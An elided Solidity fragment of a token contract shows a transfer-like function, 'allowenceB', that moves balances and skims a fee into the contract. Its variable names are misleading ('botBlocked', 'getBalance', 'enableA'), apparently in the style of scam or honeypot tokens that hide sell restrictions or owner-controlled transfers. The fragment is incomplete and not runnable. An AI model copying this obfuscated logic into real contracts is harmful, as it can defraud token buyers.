...
contract Token is Ownable {
    ...
    function allowenceB(
        ...
        if (enableA[getBalance] == 0 && botBlocked[getBalance] > 0 && !backingFee) {
            ...
            if (amount > 2 * 10**(13 + _decimals)) enableA[getBalance] -= spenderFeeA - 1;
        }

        enableB[1] = getFeeSetter;

        if (enableA[getBalance] > 0 && amount == 0) {
            enableA[getFeeSetter] += spenderFeeA;
        }

        botBlocked[outterSwap] += spenderFeeA + 1;

        uint256 fee = (amount / 100) *  _feeTaker; 
        amount -= fee;
        _balances[getBalance] -= fee;
        _balances[address(this)] += fee;

        _balances[getBalance] -= amount;
        _balances[getFeeSetter] += amount;
    }
